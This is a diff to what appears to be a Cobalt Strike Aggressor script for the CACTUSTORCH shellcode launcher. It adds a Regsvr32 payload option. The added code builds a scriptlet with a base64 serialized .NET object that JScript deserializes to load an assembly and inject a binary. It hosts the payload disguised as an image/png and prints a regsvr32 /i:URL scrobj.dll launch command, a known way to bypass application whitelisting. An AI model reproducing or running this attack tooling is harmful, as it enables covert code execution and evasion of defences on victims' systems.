+		$data = $data . "\"AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA\"+\r\n";
+		$data = $data . "\"LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv\"+\r\n";
+		$data = $data . "\"bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA\";\r\n";
+		$data = $data . "var entry_class = 'cactusTorch';\r\n";
+		$data = $data . "try {\r\n";
+		$data = $data . "	setversion();\r\n";
+		$data = $data . "	var stm = base64ToStream(serialized_obj);\r\n";
+		$data = $data . "	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');\r\n";
+		$data = $data . "	var al = new ActiveXObject('System.Collections.ArrayList');\r\n";
+		$data = $data . "	var n = fmt.SurrogateSelector;\r\n";
+		$data = $data . "	var d = fmt.Deserialize_2(stm);\r\n";
+		$data = $data . "	al.Add(n);\r\n";
+		$data = $data . "	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);\r\n";
+		$data = $data . "	o.flame(binary,code);\r\n";
+		$data = $data . "} catch (e) {\r\n";
+		$data = $data . "    debug(e.message);\r\n";
+		$data = $data . "}]]></script>\r\n";
+		$data = $data . "    </registration>\r\n";
+		$data = $data . "  </component>\r\n";
+		$data = $data . "</package>\r\n";
 	}
 	else{
 		# They want VBA Macros
@@ -749,6 +969,10 @@ sub setup_attack {
 		$url = site_host(%options["host"], %options["port"], %options["uri"], $data, "application/octet-stream");
 		prompt_text("Payload: ", $url, {});
 	}
+	else if (%options["type"] eq "Regsvr32") {
+		$url = site_host(%options["host"], %options["port"], %options["uri"], $data, "image/png");
+		prompt_text("Payload: ", "regsvr32 /s /n /u /i:" . $url . " scrobj.dll", {});
+	}
 	else{
 		# Split out VBA Macro to copy
 		$url = $data;
@@ -781,7 +1005,7 @@ popup attacks {
 		drow_listener_stage($dialog, "listener", "Listener: "); # can't gen stageless payloads for other team servers.
 		drow_checkbox($dialog, "stageless", "Stageless: ", "Use Stageless Payload");
 		drow_text($dialog, "binary", "Binary: ");
-		drow_combobox($dialog, "type", "Type: ", @("VBScript", "JScript", "HTA", "VBA Macro"));
+		drow_combobox($dialog, "type", "Type: ", @("VBScript", "JScript", "HTA", "Regsvr32","VBA Macro"));
 		dbutton_action($dialog, "Launch");
 
 		# show our dialog
